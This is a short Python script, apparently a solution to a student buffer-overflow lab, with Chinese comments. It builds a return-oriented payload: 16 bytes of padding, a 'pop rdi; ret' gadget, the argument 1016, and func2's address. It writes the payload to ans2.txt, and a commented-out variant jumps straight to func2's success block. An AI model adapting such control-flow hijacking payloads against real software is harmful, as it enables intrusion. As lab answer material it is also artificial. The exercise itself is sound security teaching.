# padding: 8字节buffer + 8字节old_rbp
padding = b'A' * 16

# 正规方法:
pop_rdi_ret = b"\xc7\x12\x40\x00\x00\x00\x00\x00" # 只取 pop rdi; ret 的片段
arg_value   = b"\xf8\x03\x00\x00\x00\x00\x00\x00"    # 1016
func2_addr  = b"\x16\x12\x40\x00\x00\x00\x00\x00" # func2 正常入口

payload = padding + pop_rdi_ret + arg_value + func2_addr

# 歪门邪道:
# func2_success_block = b"\x4c\x12\x40\x00\x00\x00\x00\x00"
# payload = padding + func2_success_block

# 写入文件
with open("ans2.txt", "wb") as f:
    f.write(payload)